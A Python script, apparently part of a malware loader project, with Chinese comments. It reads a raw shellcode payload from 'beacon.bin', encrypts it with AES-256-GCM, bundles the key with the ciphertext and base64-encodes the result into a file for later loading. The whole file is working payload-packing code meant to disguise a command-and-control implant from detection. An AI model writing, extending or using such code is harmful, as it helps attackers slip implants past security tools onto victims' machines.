import base64

from common.crypto_utils import crypto_utils
# from loguru import logger
from common.project_path import project_path
"""
对raw格式的payload进行AES-256-GCM加密
生成shellcode_cipher.tmp
"""


def gen_aes_payload():
    with open(project_path.get_project_path() + "/bean_raw/beacon.bin", "rb") as f:
        shellcode = f.read()
    shellcode_cipher = crypto_utils.get_key()
    shellcode_cipher += b"||split||"
    # logger.debug(f"key: {crypto_utils.get_key()}")
    shellcode_cipher += crypto_utils.encrypt(shellcode)
    # print(shellcode_cipher)
    # logger.debug(shellcode_cipher)
    with open(project_path.get_project_path() + "/resource/shellcode_cipher.tmp", "wb") as f:
        f.write(base64.b64encode(shellcode_cipher))
    # logger.info("payload 加密成功")
    # logger.info(f.name)


if __name__ == '__main__':
    gen_aes_payload()